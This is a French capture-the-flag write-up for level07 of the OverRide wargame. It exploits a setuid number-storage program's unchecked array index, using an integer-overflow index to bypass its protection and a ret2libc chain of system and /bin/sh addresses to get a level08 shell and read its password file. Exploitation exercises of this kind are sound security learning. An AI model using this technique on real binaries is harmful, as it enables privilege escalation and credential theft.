## Comportement
- J'ai des droits `level06` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07*`
En exécutant le binaire (`./level07`), on observe:
    - 3 commandes possible : lire, stocker des nombres et quitter.  
    ```shell
    level07@OverRide:~$ ./level07 
    ----------------------------------------------------
    Welcome to wil's crappy number storage service!   
    ----------------------------------------------------
    Commands:                                          
        store - store a number into the data storage    
        read  - read a number from the data storage     
        quit  - exit the program                        
    ----------------------------------------------------
    wil has reserved some storage :>                 
    ----------------------------------------------------

    Input command: read
    Index: 11
    Number at data[11] is 0
    Completed read command successfully
    Input command: store
    Number: 42
    Index: 11
    Completed store command successfully
    Input command: read
    Index: 11
    Number at data[11] is 42
    Completed read command successfully
    Input command: quit
    level07@OverRide:~$ 
    ```


## Analyse
En analysant le binaire (`gdb ./level07`) on observe:
- Argv et Env sont remis a zero par securite : il ne sera donc pas possible d'y mettre un shellcode ici.
- Le programme stock des nombres dans un tableau de taille 100 mais ne fait aucune verification quant a l'index que lui envoie pour voir s'il est bien compris entre 0 et 99. On peut donc lire et ecrire au dela. On a donc acces a la stack.
    ```shell
    level07@OverRide:~$ ./level07 
    ----------------------------------------------------
    Welcome to wil's crappy number storage service!   
    ----------------------------------------------------
    Commands:                                          
        store - store a number into the data storage    
        read  - read a number from the data storage     
        quit  - exit the program                        
    ----------------------------------------------------
    wil has reserved some storage :>                 
    ----------------------------------------------------

    Input command: read
    Index: -123
    Number at data[4294967173] is 4294955824
    Completed read command successfully
    Input command: store
    Number: 99
    Index: -123
    Completed store command successfully
    Input command: read
    Index: -123
    Number at data[4294967173] is 99
    Completed read command successfully
    Input command: quit
    ```
- Chaque index sur 3 est protege et on ne peut rien y ecrire. (i % 3 == 0)


## Résolution
- Tout d'abord trouvons l'adresse du tableau dans lequel sont stockees les donnees : 
    ```shell
    (gdb) b read_number
    Breakpoint 1 at 0x80486dd
    (gdb) run
    Starting program: /home/users/level07/level07 
    ...
    Input command: read

    Breakpoint 1, 0x080486dd in read_number ()
    (gdb) x $ebp+0x8   # Le tableau est load avec = `DWORD PTR [ebp+0x8]`
    0xffffd430:	0xffffd454
    ```
- 0xffffd430 est l'adresse où est stockée l'adresse du tableau et 0xffffd454 est l'adresse du tableau lui-même. Pour obtenir l'indice où est stockée l'adresse du tableau sur le tableau, nous devons calculer la différence entre ces 2 adresses et la divisee par 4 puisque c'est un tableau d'int : 
```shell
(0xffffd440 - 0xffffd464) / 4 = -36 / 4 = -9
```
- L'index de l'adresse du tableau pendant le runtime est donc -9.
- Maintenant on doit trouver l'adresse de l'EIP pour l'overwrite : 
    ```shell
    (gdb) b *0x0804892b    #0x0804892b <+520>:	call   0x80486d7 <read_number>    ; ret = read_number()
    Breakpoint 1 at 0x804892b
    (gdb) run
    ...
    Input command: read

    Breakpoint 1, 0x0804892b in main ()
    (gdb) info frame
    ...
    Saved registers:
    ebx at 0xffffd60c, ebp at 0xffffd618, esi at 0xffffd610,
    edi at 0xffffd614, eip at 0xffffd61c

    (gdb) p/d (0xffffd61c - 0xffffd454) / 4 # on calcule comme l'etape precedente.
    $1 = 114 # malheureusement cet index ets protege (114 % 3 == 0)
    ```
- L'index 114 etant protege, nous allons overflow l'int. En utilisant la valeur maximale d'un entier non signé (UINT_MAX), divisée par 4, on obtient 1073741824. Cette valeur, multipliée par 4 dans le programme, provoque un overflow, résultant en zéro. Pour exploiter cela, on ajoute 114 (= 1073741938) utilisant ainsi l'overflow à notre avantage. Cela contourne bien la securite en place.
- Enfin, nous allons utiliser un ret2libc. Il nous faut donc les adresses suivantes : 
    ```shell
    info function system
    0xf7e6aed0 = 4159090384  system

    info function exit
    0xf7e5eb70 = 4159040368  exit

    Adresse de /bin/sh:
    find __libc_start_main,+99999999,"/bin/sh"
    0xf7f897ec = 4160264172
    ```
- Il ne reste plus qu'a mettre tout en place : 
    ```shell
    $ ./level07 
    ...
    Input command: store
    Number: 4159090384
    Index: 1073741938
    Completed store command successfully
    Input command: store
    Number: 4160264172
    Index: 116
    Completed store command successfully
    Input command: quit
    ```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level08`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/users/level08/.pass`)
  - quitter le shell (`exit`)
  - et passer au level08 (`su level08`) en renseignant ce password.
  